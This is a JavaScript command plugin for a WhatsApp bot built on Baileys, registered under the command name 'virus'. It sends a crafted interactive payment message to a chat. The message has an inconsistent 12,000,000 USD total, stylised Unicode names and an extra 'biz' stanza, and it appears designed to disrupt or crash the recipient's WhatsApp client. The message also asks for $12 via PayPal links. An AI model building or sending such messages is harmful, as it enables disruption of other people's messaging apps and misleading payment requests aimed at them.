import fs from 'fs';
import * as crypto from 'crypto';
import { generateMessageIDV2, prepareWAMessageMedia } from '@whiskeysockets/baileys';

// Función para generar los datos del pago
const generatePaymentData = () => {
  return JSON.stringify({
    currency: "USD",
    total_amount: {
      value: 1200000000,
      offset: 100
    },
    reference_id: "𝖃𝖊𝖔𝖓 🦄ユニコード",
    type: "physical-goods",
    order: {
      status: "payment_requested",
      subtotal: {
        value: 10000,
        offset: 100
      },
      tax: {
        value: 5600,
        offset: 100
      },
      discount: {
        value: 3000,
        offset: 100
      },
      shipping: {
        value: 20000,
        offset: 100
      },
      order_type: "ORDER",
      items: [
        {
          retailer_id: "00000000",
          product_id: "000000",
          name: "𝖃𝖊𝖔𝖓 🦄ユニコード",
          amount: {
            value: 10000,
            offset: 100
          },
          quantity: 100
        }
      ]
    },
    native_payment_methods: [],
    share_payment_status: false
  });
};

// Manejador del comando
const handler = async (m, { conn, text, command }) => {
  const media = await prepareWAMessageMedia(
    { image: { url: 'https://files.catbox.moe/02quu5.jpg' } },
    { upload: conn.waUploadToServer }
  );

  const stanza = [
    {
      tag: "biz",
      attrs: {
        native_flow_name: "order_details"
      }
    }
  ];

  const message = {
    interactiveMessage: {
      header: {
        title: '🎉 DG 𝕮𝖆𝖗𝖑𝖔𝖘',
        subtitle: 'Vinculación Premium',
        hasMediaAttachment: true,
        jpegThumbnail: media.imageMessage.jpegThumbnail
      },
      body: {
        text: '💵 *$12 dólares* por vinculación de Telegram a WhatsApp.\n\nPuedes pagar con PayPal fácilmente.'
      },
      footer: {
        text: '👉 También puedes pagar aquí: https://paypal.me/CarlosFiden410/12'
      },
      nativeFlowMessage: {
        messageVersion: 1,
        buttons: [
          {
            name: "review_and_pay",
            buttonParamsJson: generatePaymentData()
          },
          {
            name: "paypal_direct",
            buttonParamsJson: JSON.stringify({
              type: "url_button",
              display_text: "💸 Pagar $12 por PayPal",
              url: "https://paypal.me/CarlosFiden410/12"
            })
          }
        ]
      }
    },
    messageContextInfo: {
      messageSecret: crypto.randomBytes(32)
    }
  };

  await conn.relayMessage(
    m.chat,
    message,
    {
      messageId: generateMessageIDV2(conn.user?.id),
      additionalNodes: stanza
    }
  );
};

handler.command = ['virus'];

export default handler;
